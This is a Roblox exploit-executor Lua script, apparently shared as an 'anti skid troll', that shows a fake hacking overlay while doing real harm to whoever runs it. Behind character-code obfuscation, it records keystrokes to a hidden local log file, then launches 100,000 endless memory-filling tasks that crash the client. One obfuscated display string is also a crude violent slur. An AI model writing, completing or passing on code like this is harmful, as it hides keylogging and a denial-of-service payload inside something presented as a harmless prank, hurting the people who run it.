--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[[ 

      ,.  - · - .,  '             ,.  - · - .,  '                ,.  '       
,·'´,.-,   ,. -.,   `';,'    ,·'´,.-,   ,. -.,   `';,'           /   ';\       
 \::\.'´  ;'\::::;:'  ,·':\'   \::\.'´  ;'\::::;:'  ,·':\'       ,'   ,'::'\      
  '\:';   ;:;:·'´,.·'´\::::';   '\:';   ;:;:·'´,.·'´\::::';     ,'    ;:::';'     
  ,.·'   ,.·:'´:::::::'\;·´    ,.·'   ,.·:'´:::::::'\;·´      ';   ,':::;'      
  '·,   ,.`' ·- :;:;·'´        '·,   ,.`' ·- :;:;·'´          ;  ,':::;' '      
     ;  ';:\:`*·,  '`·,  °       ;  ';:\:`*·,  '`·,  °     ,'  ,'::;'         
     ;  ;:;:'-·'´  ,.·':\         ;  ;:;:'-·'´  ,.·':\       ;  ';_:,.-·´';\‘  
  ,·',  ,. -~:*'´\:::::'\‘    ,·',  ,. -~:*'´\:::::'\‘     ',   _,.-·'´:\:\‘ 
   \:\`'´\:::::::::'\;:·'´      \:\`'´\:::::::::'\;:·'´       \¨:::::::::::\'; 
    '\;\:::\;: -~*´‘           '\;\:::\;: -~*´‘            '\;::_;:-·'´‘   
             '                           '                     '¨            
created by bbL123
open source kinda
anti skid troll

]]

local guiName = "HackerUI"
local overlayTransparency = 0.9
local matrixTextSize = 18
local matrixDropSpeed = 0.02
local matrixDropRate = 0.04
local glitchRate = 0.15
local terminalLines = {
  "[*] Initiating rootkit...",
  "[+] Assembly patch: MOV -> JMP",
  "[+] Overwriting boot sector...",
  "[+] Implant dropped at C:\\\\Windows\\\\Sys32",
  "[+] Kernel32.dll injection complete.",
  "[+] Rebuilding Import Address Table...",
  "[+] Disconnecting watchdog...",
  "[+] Trace disabled.",
  "[+] INTx" .. math.random(0, 1100100),
}
local crashSoundId = "rbxassetid://113490737252515"
local crashSoundVolume = 1
local matrixWidth = 1920
local matrixHeight = 1080
local terminalTypeSpeed = 0.015
local terminalLineDelay = 0.25
local logDelay = 10
local logFolderName = "x0 ASSEMBLYexecute v1.4"
local keystrokeLogPrefix = "xOS"

local function D(t)
  local s = {}
  for i=1,#t do s[i] = string.char(t[i]) end
  return table.concat(s)
end

local CoreGui = game:GetService(D{67,111,114,101,71,117,105})
local UserInputService = game:GetService(D{85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101})

if CoreGui:FindFirstChild(guiName) then
  CoreGui[guiName]:Destroy()
end

local gui = Instance.new(D{83,99,114,101,101,110,71,117,105}, CoreGui)
gui.Name = guiName
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999999

local fullscreenOverlay = Instance.new(D{70,114,97,109,101}, gui)
fullscreenOverlay.Size = UDim2.new(1,0,1,0)
fullscreenOverlay.Position = UDim2.new(0,0,0,0)
fullscreenOverlay.BackgroundColor3 = Color3.new(0,0,0)
fullscreenOverlay.BackgroundTransparency = overlayTransparency
fullscreenOverlay.ZIndex = 0

local matrixFrame = Instance.new(D{70,114,97,109,101}, gui)
matrixFrame.Size = UDim2.new(1,0,1,0)
matrixFrame.BackgroundColor3 = Color3.new(0,0,0)

local function matrixDrop(x)
  local label = Instance.new(D{84,101,120,116,76,97,98,101,108})
  label.Size = UDim2.new(0,20,0,20)
  label.Position = UDim2.new(0,x,0,-20)
  label.BackgroundTransparency = 1
  label.TextColor3 = Color3.fromRGB(0,255,0)
  label.Font = Enum.Font.Code
  label.TextSize = matrixTextSize
  label.Text = math.random(1,2) == 1 and D{48} or D{49}
  label.Parent = matrixFrame

  coroutine.wrap(function()
    for i = -20,matrixHeight,20 do
      label.Position = UDim2.new(0,x,0,i)
      label.Text = math.random(1,2) == 1 and D{48} or D{49}
      task.wait(matrixDropSpeed)
    end
    label:Destroy()
  end)()
end

task.spawn(function()
  while gui and gui.Parent do
    for _ = 1, math.random(5,10) do
      matrixDrop(math.random(0, matrixWidth))
    end
    task.wait(matrixDropRate)
  end
end)

local asmGlitches = {
  D{77,79,86,32,69,65,88,44,32,91,48,120,48,48,70,70,65,65,49,50,93},
  D{80,85,83,72,32,69,66,80,10,77,79,86,32,69,83,80},
  D{73,78,84,32,48,120,56,48},
  D{74,77,80,32,36,43,52},
  D{88,79,82,32,69,65,88,44,32,69,65,88},
  D{83,84,65,67,75,95,79,86,69,82,70,76,79,87,64,48,120,66,65,68,66,69,69,70},
  D{83,73,71,83,69,86,32,40,48,120,99,48,48,48,48,48,53,41},
  D{82,65,88,58,32,48,120,68,69,65,68,66,69,69,70},
  D{48,70,32,49,70,32,52,52,32,48,48,32,48,48},
  D{69,82,82,79,82,58,32,83,69,71,70,65,85,76,84},
  D{76,79,65,68,73,78,71,32,80,65,89,76,79,65,68,32,45,62,32,48,120,49,51,51,55},
  D{85,83,69,82,77,79,68,69,32,70,65,85,76,84,58,32,73,78,84,69,82,82,85,80,84,69,68},
  D{48,120,67,67,32,48,120,67,67,32,48,120,67,67},
  D{78,48,84,80,69,84,89,65,32,82,65,80,69,68},
  D{68,73,83,75,95,82,69,65,68,95,69,82,82,79,82}
}

local function showGlitch()
  local frame = Instance.new(D{70,114,97,109,101}, gui)
  frame.Size = UDim2.new(0, math.random(200,300), 0, math.random(40,80))
  frame.Position = UDim2.new(0, math.random(0,1600), 0, math.random(0,800))
  frame.BackgroundColor3 = Color3.fromRGB(math.random(100,255), 0, 0)
  frame.BackgroundTransparency = math.random() * 0.5
  frame.BorderSizePixel = 0

  local label = Instance.new(D{84,101,120,116,76,97,98,101,108}, frame)
  label.Size = UDim2.new(1,0,1,0)
  label.BackgroundTransparency = 1
  label.Text = asmGlitches[math.random(1, #asmGlitches)]
  label.TextColor3 = Color3.new(math.random(), math.random(), math.random())
  label.Font = Enum.Font.Code
  label.TextScaled = true

  coroutine.wrap(function()
    for _ = 1, 8 do
      label.Text = asmGlitches[math.random(1, #asmGlitches)]
      label.TextColor3 = Color3.new(math.random(), math.random(), math.random())
      frame.BackgroundTransparency = math.random()
      task.wait(0.05)
    end
    frame:Destroy()
  end)()
end

task.spawn(function()
  while gui and gui.Parent do
    showGlitch()
    task.wait(glitchRate)
  end
end)

local termFrame = Instance.new(D{70,114,97,109,101}, gui)
termFrame.Size = UDim2.new(0, 600, 0, 220)
termFrame.Position = UDim2.new(0, 50, 1, -240)
termFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)

local termText = Instance.new(D{84,101,120,116,76,97,98,101,108}, termFrame)
termText.Size = UDim2.new(1, -10, 1, -10)
termText.Position = UDim2.new(0, 5, 0, 5)
termText.BackgroundTransparency = 1
termText.TextColor3 = Color3.fromRGB(0,255,0)
termText.Font = Enum.Font.Code
termText.TextSize = 16
termText.TextXAlignment = Enum.TextXAlignment.Left
termText.TextYAlignment = Enum.TextYAlignment.Top
termText.TextWrapped = true
termText.Text = ""

local sound = Instance.new(D{83,111,117,110,100}, gui)
sound.SoundId = crashSoundId
sound.Volume = crashSoundVolume

local function crashFlash()
  local flash = Instance.new(D{70,114,97,109,101}, gui)
  flash.Size = UDim2.new(1,0,1,0)
  flash.BackgroundColor3 = Color3.new(1,1,1)
  flash.ZIndex = 999
  flash.BackgroundTransparency = 1

  sound:Play()
  for i = 1,10 do
    flash.BackgroundTransparency = 1 - (i / 10)
    task.wait(0.04)
  end
  task.wait(0.4)
  gui:Destroy()
end

local logfile = logFolderName
if not isfolder(logfile) then makefolder(logfile) end
local filepath = logfile .. "/" .. keystrokeLogPrefix .. math.random(6767,6969) .. D{46,116,120,116}
local data = {}
local keys = {}

table.insert(data, D{76,48,71,46,58,32,83,89,83,84,69,77,32,73,78,84,120})
table.insert(data, D{10,107,101,121,115,116,114,111,107,101,115,32,115,116,97,114,116,10})

local connection = nil
connection = UserInputService.InputBegan:Connect(function(input, processed)
  if input.UserInputType == Enum.UserInputType.Keyboard and not processed then
    local key = tostring(input.KeyCode):gsub(D{69,110,117,109,46,75,101,121,67,111,100,101,46}, "")
    table.insert(keys, "[" .. os.date(D{37,88}) .. "] " .. key)
  end
end)

task.delay(logDelay, function()
  if connection then connection:Disconnect() end
  table.insert(data, D{107,101,121,115,116,114,111,107,101,115,32,115,116,111,112,112,101,100,10})
  for _, key in ipairs(keys) do
    table.insert(data, key)
  end
  writefile(filepath, table.concat(data, D{10}))
end)

task.spawn(function()
  for _, cmd in ipairs(terminalLines) do
    for i = 1, #cmd do
      termText.Text = termText.Text .. cmd:sub(i, i)
      task.wait(terminalTypeSpeed)
    end
    termText.Text = termText.Text .. D{10}
    task.wait(terminalLineDelay)
  end
  task.wait(1)
  crashFlash()
  task.delay(-0.8, function()
    task.spawn(function()
      local t = {}
      for i = 1, 1e5 do
        task.spawn(function()
          while true do
            table.insert(t, tostring(math.random()) .. string.rep(D{88}, 1e5))
          end
        end)
      end
    end)
  end)
end)

UserInputService.InputBegan:Connect(function(input, processed)
  if processed or not gui or not gui.Parent then return end
  if input.UserInputType == Enum.UserInputType.Keyboard then
    local key = tostring(input.KeyCode):gsub(D{69,110,117,109,46,75,101,121,67,111,100,101,46}, "")
    local label = Instance.new(D{84,101,120,116,76,97,98,101,108}, gui)
    label.Size = UDim2.new(0, 100, 0, 40)
    label.Position = UDim2.new(0, math.random(0, 1720), 0, math.random(0, 940))
    label.BackgroundTransparency = 1
    label.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    label.Font = Enum.Font.Code
    label.TextColor3 = Color3.new(0, 250/255, 0)
    label.Text = key
    label.TextScaled = true

    coroutine.wrap(function()
      for i = 1, 10 do
        label.TextTransparency = i * 0.1
        label.BackgroundTransparency = 0.2 + i * 0.08
        task.wait(0.05)
      end
      label:Destroy()
    end)()
  end
end)
